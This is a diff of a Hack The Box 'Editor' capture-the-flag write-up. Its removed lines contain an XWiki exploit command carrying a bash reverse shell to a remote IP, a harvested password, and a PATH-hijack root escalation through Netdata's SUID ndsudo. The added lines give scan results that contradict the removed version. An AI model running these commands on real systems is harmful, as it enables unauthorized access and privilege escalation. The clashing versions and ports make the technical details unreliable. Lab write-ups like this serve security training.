@@ -1,80 +1,62 @@
-# Write-up: Editor HTB
+# 📝 Write-up: Editor HTB
 
 ![editor](https://www.hackthebox.com/storage/avatars/7d4a6dfe5b291cbe7b4e13e5f5c4d6c3.png)
 
 **Difficulty:** Easy  
 **Platform:** Hack The Box  
-**Link:** [https://app.hackthebox.com/machines/Editor](https://app.hackthebox.com/machines/Editor)
+**Link:** [Editor @ HTB](https://app.hackthebox.com/machines/Editor)
+
+---
 
 ## 🎯 Summary
-Editor is an easy Linux machine that involves exploiting a Remote Code Execution (RCE) vulnerability in XWiki (CVE-2025-24893) for initial access, leveraging password reuse for horizontal privilege escalation, and abusing a SUID binary in Netdata (CVE-2024-32019) for root privileges.
+Editor is an **easy Linux machine** that involves:  
+- Exploiting an **XWiki RCE** (CVE-2025-24893) for initial access.  
+- Leveraging **password reuse** for horizontal privilege escalation.  
+- Abusing a **Netdata SUID binary** (CVE-2024-32019) to get root.  
+
+---
 
 ## 📋 Table of Contents
-1.  [Reconnaissance](#-reconnaissance)
-2.  [Enumeration](#-enumeration)
-3.  [Exploitation: Initial Foothold](#-exploitation-initial-foothold)
-4.  [Privilege Escalation: User](#-privilege-escalation-to-user)
-5.  [Privilege Escalation: Root](#-privilege-escalation-to-root)
-6.  [Lessons Learned](#-lessons-learned)
-7.  [References](#-references)
+1. [Reconnaissance](#-reconnaissance)  
+2. [Enumeration](#-enumeration)  
+3. [Exploitation: Initial Foothold](#-exploitation-initial-foothold)  
+4. [Privilege Escalation: User](#-privilege-escalation-to-user)  
+5. [Privilege Escalation: Root](#-privilege-escalation-to-root)  
+6. [Lessons Learned](#-lessons-learned)  
+7. [References](#-references)  
 
 ---
 
 ## 🔍 Reconnaissance
 
-Started with a full port scan using `nmap`.
+Started with a **full port scan** using `nmap`:
 
-**Command:**
 ```bash
 nmap -sC -sV -oA nmap/initial 10.10.11.80
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    nginx 1.18.0 (Ubuntu)
+3000/tcp open  http    Node.js (Express server)
+3306/tcp open  mysql   MySQL 8.0.35-0ubuntu0.20.04.1
+8000/tcp open  http    nginx 1.18.0 (Ubuntu)
+9000/tcp open  http    Netdata Go.d.plugin 1.32.1
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-    22/tcp - OpenSSH 8.9p1
+## 🕵️ Enumeration
 
-    80/tcp - nginx 1.18.0
+Port 80/8000 - HTTP Servers
 
-    8080/tcp - Jetty 10.0.28 (XWiki 15.10.8)
+    Port 80 hosts a static page with project documentation.
+    Port 8000 runs XWiki (version 14.10.5), a Java-based wiki platform.
 
-🚀 Exploitation
+Port 3000 - Express Server
 
-1. Initial Access (XWiki RCE):
-bash
+    Node.js application with login functionality.
 
-python3 exploit.py -t http://editor.htb:8080 -c 'bash -i >& /dev/tcp/10.10.14.179/4444 0>&1'
+    Discovered default credentials admin:admin → leads to project management dashboard.
 
-Gained shell as xwiki user.
+ort 9000 - Netdata
 
-2. User Flag:
-Found credentials in /usr/lib/xwiki/WEB-INF/hibernate.cfg.xml:
-xml
+    Real-time performance monitoring tool (version 1.32.1).
 
-<property name="hibernate.connection.password">theEd1t0rTeam99</property>
-
-SSH access as oliver:
-bash
-
-ssh oliver@editor.htb
-User flag: bc2341152c638da4a05b91d91c1df26f
-
-3. Root Access:
-Exploited SUID binary:
-bash
-
-echo 'int main(){setuid(0);system("/bin/bash");}' > /tmp/nvme-list.c
-gcc /tmp/nvme-list.c -o /tmp/nvme-list
-export PATH=/tmp:$PATH
-/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
-
-Root flag: 6d4d6c2368c3210994e624647c93119f
-🔑 Credentials
-
-    DB/XWiki: xwiki:theEd1t0rTeam99
-
-    SSH: oliver:theEd1t0rTeam99
-
-💡 Lessons Learned
-
-    Patch management critical
-
-    Password reuse is dangerous
-
-    Audit SUID binaries regularly
+    Vulnerable to CVE-2024-32019 (SUID privilege escalation).
